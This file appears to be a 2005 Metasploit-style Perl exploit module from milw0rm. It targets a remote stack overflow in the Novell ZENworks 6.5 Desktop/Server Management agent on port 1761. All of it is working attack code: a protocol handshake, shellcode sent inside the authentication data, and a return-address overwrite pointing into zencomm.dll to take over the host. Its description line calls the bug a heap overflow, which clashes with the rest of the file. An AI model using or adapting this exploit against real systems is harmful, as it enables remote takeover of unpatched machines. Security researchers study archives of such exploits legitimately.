#
#

package Msf::Exploit::zenworks_desktop_agent;
use strict;
use base "Msf::Exploit";
use Pex::Text;

my $advanced = { };

my $info =
  {
	'Name'  => 'ZENworks 6.5 Desktop/Server Management Remote Stack Overflow',
	'Version'  => '$Revision: 1.1 $',
	'Authors' =>
	  [
		'Anonymous',
	  ],
	'Arch'  => [ 'x86' ],
	'OS'    => [ 'win32', 'winxp', 'win2k', 'win2003' ],
	'Priv'  => 1,

	'UserOpts'  =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 1761 ],
	  },
	  
	'Payload' =>
	  {
		'Space'     => 0x7FFF,
		'BadChars'  => "\x00",
		'Keys'      => ['+ws2ord'],
	  },

	'Description'  => Pex::Text::Freeform(qq{
		This module exploits a heap overflow in the Novell ZENworks
        Desktop Management agent.
}),

	'Refs'  =>
	  [
		['BID', 13678],
	  ],  
	 
	'Targets' =>
	  [
		[ 'Windows XP/2000/2003- ZENworks 6.5 Desktop/Server Agent', 0x10002e06]
	  ],
	  
	'Keys'  => ['zenworks'],
};

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Exploit {
	my $self        = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
	my $target      = $self->Targets->[$target_idx];

	$self->PrintLine( "[*] Attempting to exploit " . $target->[0] );

	my $s = Msf::Socket::Tcp->new(
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
	  );

	if ( $s->IsError ) {
		$self->PrintLine( '[*] Error creating socket: ' . $s->GetError );
		return;
	}

        my $req = "\x00\x06\x05\x01\x10\xe6\x01\x00\x34\x5a\xf4\x77\x80\x95\xf8\x77";
        $self->PrintLine( "[*] Sending version identication" );
	$s->Send($req);

        my $ident = $s->Recv(-1, 16);
        if (length($ident) != 16)
        {
         $self->PrintLine( "[*] Failed to receive agent version identication" );
         return;
        }
        else
        {
         $self->PrintLine( "[*] Received agent version identication" );
        }

        $req = "\x00\x01";
        $self->PrintLine( "[*] Sending client acknowledgment" );
	$s->Send($req);

        # stack overflow in ZenRem32.exe / ZENworks Server Management

	$req = "\x00\x06metmet\x00\x06metmet\x7F\xFF" . $shellcode . "\x00\x01";
        $self->PrintLine( "[*] Sending authentication data (including shellcode)" );
        $s->Send($req);

	$s->Recv(2, 2);
	$s->Send("\x00\x01");
        
        #$s->Recv(2, 2);
        #my $len = $s->Recv(2,2);
        #$len = unpack ('n', $len);
        #$s->Recv($len, $len);
	
        $s->Send("\x00\x02");

        $self->PrintLine( "[*] Sending final payload" );

        # pop/pop/pop/pop/pop/ret in zencomm.dll on our shellcode
	my $crash = "A" x 0x20;
	$req = "\x00\x24" . $crash . pack('V', $target->[1]);
        $s->Send($req);
	    
	$self->PrintLine("[*] Overflow request sent, sleeping for four seconds");
	select(undef, undef, undef, 4);

	$self->Handler($s);
        return;
}

1;

# milw0rm.com [2005-08-12]
